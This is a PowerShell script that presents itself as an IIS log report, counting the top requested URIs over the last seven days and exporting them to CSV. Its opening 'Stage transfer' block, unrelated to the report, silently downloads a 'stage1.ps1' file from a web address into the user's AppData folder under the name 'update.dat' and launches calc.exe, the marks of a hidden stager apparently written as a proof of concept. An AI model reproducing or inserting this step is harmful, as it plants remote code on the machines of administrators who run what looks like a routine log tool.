<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://localhost:8000/stage1.ps1",
    [string]$Stage2Path = "$env:APPDATA\update.dat"
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $Stage2Path)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$ProgressPreference = "SilentlyContinue"
$LogRoot    = 'C:\inetpub\logs\LogFiles\W3SVC7'
$Days       = 7
$TopN       = 15
$OutputPath = 'C:\Reports\iis-top-2025-11-08.csv'
$HtmlPath   = 'D:\Ops\reports\iis-2025-11-08.html'


$cutoff = (Get-Date).AddDays(-$Days)
$logs = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
$entries = foreach ($log in $logs) {
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        [pscustomobject]@{ Status = [int]$parts[8]; Uri = $parts[3] }
    }
}

$entries | Group-Object Uri | Sort-Object Count -Descending |
    Select-Object -First $TopN Name, Count |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Parsed {0} lines from {1} files" -f @($entries).Count, @($logs).Count) -ForegroundColor Cyan
